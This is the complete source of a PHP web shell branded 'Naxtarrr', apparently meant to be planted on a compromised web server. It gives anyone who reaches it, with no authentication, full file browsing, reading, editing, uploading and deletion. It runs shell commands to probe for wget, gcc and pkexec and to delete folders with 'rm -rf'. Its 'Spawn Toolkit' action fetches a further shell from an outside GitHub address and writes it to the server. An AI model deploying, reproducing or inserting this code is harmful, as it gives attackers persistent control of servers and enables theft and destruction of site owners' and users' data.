<?
$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";

$os = php_uname('s');

$separator = ($os === 'Windows') ? "\\" : "/";

$explode = explode($separator, $path);

function doFile($file, $content)
{
  if ($content == "") {
    $content = base64_encode("empty");
  }

  $op = fopen($file, "w");
  $write = fwrite($op, base64_decode($content));
  fclose($op);
  return ($write) ? true : false;
}

function getFileSize($path)
{
  $bytes = filesize($path);
  $units = array('B', 'KB', 'MB', 'GB');
  $unit = 0;
  while ($bytes >= 1024 && $unit < count($units) - 1) {
    $bytes /= 1024;
    $unit++;
  }
  return round($bytes, 2) . ' ' . $units[$unit];
}

function hi_permission($items)
{
  $perms = fileperms($items);
  if (($perms & 0xC000) == 0xC000) {
    $info = 's';
  } elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
  } elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
  } elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
  } elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
  } elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
  } elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
  } else {
    $info = 'u';
  }
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}
?>

<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Naxtarrr">
  <meta name="robots" content="noindex, nofollow">
  <title>Nx</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.min.css">
  <link rel="stylesheet" href="https://naxtarrr.netlify.app/assets/css/style_style3.css">
</head>

<body>

  <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-labelledby="serverInfoModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-header">
          <h1 class="modal-title fs-5" id="serverInfoModalLabel">Server Info</h1>
          <button type="button" class="btn btn-danger btn-sm" data-bs-dismiss="modal" aria-label="Close"><i class="bi bi-x-lg"></i></button>
        </div>
        <div class="modal-body">
          <?php
          $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
          $disfuncs = @ini_get("disable_functions");
          $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
          ?>
          <span class="fw-medium">System Info: <?= php_uname(); ?></span><br>
          <span class="fw-medium">PHP Version: <?= phpversion(); ?></span><br>
          <span class="fw-medium" style="width: 100%; max-width: 350px;">CURL: <?= $curl; ?>, WGET: <?= $wget; ?><br>PERL: <?= $perl; ?>, RUBY: <?= $ruby; ?><br>GCC: <?= $gcc; ?>, PKEXEC: <?= $pkexec; ?></span><br>
          <span class="fw-medium">Disabled Functions: <?= $showdisbfuncs; ?></span>
        </div>
      </div>
    </div>
  </div>

  <div class="d-flex main-content">
    <div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
      <div class="offcanvas-header">
        <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
      </div>
      <div class="offcanvas-body px-0">
        <ul class="navbar-nav justify-content-end flex-grow-1">
          <li class="nav-item">
            <a class="nav-link" href="?">
              <i class="bi bi-house-door-fill"></i>
              <span class="ms-1">Home</span>
            </a>
          </li>
          <li class="nav-item">
            <button type="button" class="nav-link btn btn-link" data-bs-toggle="modal" data-bs-target="#serverInfoModal">
              <i class="bi bi-info-circle-fill"></i>
              <span class="ms-1">Server Info</span>
            </button>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="?path=<?= $path; ?>&a=toolkit">
              <i class="bi bi-wrench-adjustable-circle-fill"></i>
              <span class="ms-1">Spawn Toolkit</span>
            </a>
          </li>
        </ul>
      </div>
    </div>

    <div class="container-fluid">
      <nav class="navbar navbar-dark sticky-top">
        <div class="container-fluid">
          <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <a class="navbar-brand" href="?">Naxtarrr</a>
        </div>
      </nav>

      <div class="navigation mt-3">
        <?php
        if (isset($_GET["file"]) && !isset($_GET["path"])) {
          $path = dirname($_GET["file"]);
        }
        $path = str_replace("\\", "/", $path);

        $paths = explode("/", $path);
        echo 'Path: ';
        echo (!preg_match("/Windows/", $os)) ? "<a class='font-weight-bold text-decoration-none folder' id='dir' href='?path=/'>~</a>" : "";
        foreach ($paths as $id => $pat) {
          echo "<a href='?path=";
          for ($i = 0; $i <= $id; $i++) {
            echo $paths[$i];
            if ($i != $id) {
              echo "/";
            }
          }
          echo "'>$pat</a>/";
        }
        ?>
      </div>
      <?php
      if ($_SERVER["REQUEST_METHOD"] === "POST") {
        if (isset($_FILES["nax_file"])) {
          $file = basename($_FILES["nax_file"]["name"]);
          $targetFile = $path . $separator . $file;

          if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $targetFile)) {
            echo "<script>alert('$file uploaded'); window.location = '?path=$path';</script>";
          } else {
            echo "<script>alert('Upload failed'); window.location = '?path=$path';</script>";
          }
        }
      }

      if (!isset($_GET["a"])) :
        if (is_readable($path)) :
      ?>

          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Size</th>
                  <th>Permission</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                <?php
                foreach (scandir($path) as $items) {
                  if (!is_dir($path . $separator . $items) || $items === ".." || $items === ".") continue;
                  $color = (is_writable($path . $separator . $items)) ? "text-success" : "text-danger";
                ?>
                  <tr>
                    <td width="450">
                      <a href='?path=<?= $path . $separator . $items; ?>'>
                        <i class="bi bi-folder-fill text-warning"></i> <?= $items; ?>
                      </a>
                    </td>
                    <td width="70">---</td>
                    <td width="80" class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
                    <td width="90">
                      <a href='?path=<?= $path . $separator . $items; ?>&a=rename' class="btn btn-warning btn-sm">
                        <i class="bi bi-pencil-fill"></i>
                      </a>
                      <a href='?path=<?= "$path$separator$items"; ?>&a=delete' class="btn btn-danger btn-sm" onclick="return confirm('Delete folder <?= $items; ?>?')">
                        <i class="bi bi-trash3-fill"></i>
                      </a>
                    </td>
                  </tr>
                  <?php
                }
                foreach (scandir($path) as $items) {
                  if (is_file($path . $separator . $items)) {
                    $color = (is_writable($path . $separator . $items)) ? "text-success" : "text-danger";
                  ?>
                    <tr>
                      <td width="450">
                        <a href='?file=<?= "$path$separator$items&a=view"; ?>'>
                          <i class="bi bi-file-earmark-fill text-primary text-opacity-75"></i> <?= $items; ?>
                        </a>
                      </td>
                      <td width="70"><?= getFileSize("$path$separator$items"); ?></td>
                      <td width="80" class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
                      <td width="90">
                        <a href='?file=<?= "$path$separator$items"; ?>&a=editFile' class="btn btn-success btn-sm">
                          <i class="bi bi-pencil-square"></i>
                        </a>
                        <a href='?file=<?= "$path$separator$items"; ?>&a=rename' class="btn btn-warning btn-sm">
                          <i class="bi bi-pencil-fill"></i>
                        </a>
                        <a href='?file=<?= "$path$separator$items"; ?>&a=delete' class="btn btn-danger btn-sm" onclick="return confirm('Delete file <?= $items; ?>?')">
                          <i class="bi bi-trash3-fill"></i>
                        </a>
                      </td>
                    </tr>
                <?php
                  }
                }
                ?>
              </tbody>
            </table>
          </div>
        <?php
        else :
          echo "This directory's not readable";
        endif;
      endif;

      if (isset($_GET['a']) && $_GET['a'] == "view") {
        $filename = basename($_GET["file"]);
        ?>
        <div class="card">
          <span style="display: block; margin-bottom: 10px;">Filename: <?= $filename; ?></span>
          <textarea><?= htmlspecialchars(file_get_contents($file)); ?></textarea>
        </div>
      <?php
      } elseif (isset($_GET["a"]) && $_GET["a"] == "createFile") {
      ?>
        <div class="card">
          <form method="post">
            <div class="mb-1">
              <label for="filename" class="label-form">Filename: </label>
              <input type="text" name="filename" id="filename" placeholder="file.txt" required>
            </div>
            <div class="mb-1">
              <label for="content" class="label-form">Content: </label>
              <textarea name="content" id="content"></textarea>
            </div>
            <button type="submit" class="btn-primary">Submit</button>
          </form>
        </div>
        <?php
        if (isset($_POST["filename"])) {
          $filename = $_POST["filename"];
          $content = base64_encode($_POST["content"]);
          if (doFile($path . $separator . $filename, $content)) {
            echo "<script>alert('$filename Created'); window.location = '?path=$path';</script>";
          } else {
            echo "Failed to create";
          }
        }
      } elseif (isset($_GET["a"]) && $_GET["a"] == "createFolder") {
        ?>
        <div class="card">
          <form method="post">
            <div class="mb-1">
              <label for="foldername" class="label-form">Folder Name: </label>
              <input type="text" name="foldername" id="foldername" placeholder="folder" required>
            </div>
            <button type="submit" class="btn-primary">Submit</button>
          </form>
        </div>
        <?php
        if (isset($_POST["foldername"])) {
          $foldername = $_POST["foldername"];
          echo (mkdir($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?path=$path';</script>" : "Failed to create";
        }
      } elseif (isset($_GET['a']) && $_GET["a"] == "editFile") {
        $file = basename($_GET["file"]);
        ?>
        <div class="card">
          <form method="post">
            <label for="content" class="label-form">Filename: <?= $file; ?></label>
            <textarea name="content" id="content"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea><br>
            <button type="submit" class="btn-primary">Submit</button>
          </form>
        </div>
        <?php
        if (isset($_POST["content"])) {
          $content = base64_encode($_POST["content"]);
          if (doFile($path . $separator . $file, $content)) {
            $filename = basename($file);
            echo "<script>alert('$filename Edited'); window.location = '?path=$path';</script>";
          } else {
            echo "Failed to create";
          }
        }
      } elseif (isset($_GET['a']) && $_GET["a"] == "delete") {
        if (!empty($_GET["file"])) {
          $filename = basename($file);
          if (unlink($file)) {
            echo "<script>alert('$filename Deleted'); window.location = '?path=" . dirname($_GET["file"]) . "';</script>";
          } else {
            echo "Delete $filename failed";
          }
        } else {
          $folder_name = basename($path);
          if (is_writable($path)) {
            @rmdir($path);
            @shell_exec("rm -rf \"$path\"");
            @shell_exec("rmdir /s /q \"$path\"");
            echo "<script>alert('$folder_name Deleted'); window.location = '?path=" . dirname($path) . "';</script>";
          } else {
            echo "Delete $folder_name failed";
          }
        }
      } elseif (isset($_GET['a']) && $_GET["a"] == "rename") {
        $oriname = (isset($_GET["file"])) ? basename($_GET["file"]) : basename($_GET["path"]);
        ?>
        <div class="card">
          <form method="post">
            <div class="mb-1">
              <label for="newname" class="label-form">New Name: </label>
              <input type="text" name="newname" id="newname" value="<?= $oriname; ?>" required>
            </div>
            <button type="submit" class="btn-primary">Submit</button>
          </form>
        </div>
      <?php
        if (isset($_POST["newname"])) {
          $newname = $_POST["newname"];
          $path = (isset($_GET["file"])) ? dirname($_GET["file"]) : dirname($_GET["path"]);
          if (rename($path . $separator . $oriname, $path . $separator . $newname)) {
            echo "<script>alert('$oriname renamed to $newname'); window.location = '?path=$path';</script>";
          } else {
            "Failed to rename";
          }
        }
      } elseif (isset($_GET['a']) && $_GET["a"] == "toolkit") {
        echo (doFile("$path/tools.php", base64_encode(file_get_contents("https://raw.githubusercontent.com/nastar-id/kegabutan/master/shelk.php")))) ? "<script>alert('Toolkit spawned!'); window.location = '?path=$path';</script>" : "<script>alert('Toolkit failed'); window.location = '?path=$path';</script>";
      }
      ?>
      <footer class="my-4 text-center">
        <p>Naxtarrr | D704T Team</p>
      </footer>
    </div>

    <div class="position-fixed btn-group dropup" style="bottom: 10px; right: 10px;">
      <button type="button" class="btn dropdown-toggle" style="background-color: #fd39a1; color: #fff;" data-bs-toggle="dropdown" aria-expanded="false">
        <i class="bi bi-three-dots-vertical"></i>
      </button>
      <ul class="dropdown-menu">
        <li>
          <a href="?path=<?= $path; ?>&a=createFile" class="dropdown-item">Create File</a>
        </li>
        <li>
          <a href="?path=<?= $path; ?>&a=createFolder" class="dropdown-item">Create Folder</a>
        </li>
        <li>
          <label for="naxx" class="dropdown-item cursor-pointer">Upload File</label>
        </li>
      </ul>

      <input class='toggle' id='menu' type='checkbox' style="display: none;">

      <form method="POST" enctype="multipart/form-data" id="upload" class="d-none">
        <input type="file" name="nax_file" id="naxx">
      </form>
    </div>


  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const uploadInput = document.querySelector("#naxx");
    uploadInput.addEventListener("change", () => {
      const uploadForm = document.querySelector("#upload");
      uploadForm.submit();
    });
  </script>
</body>

</html>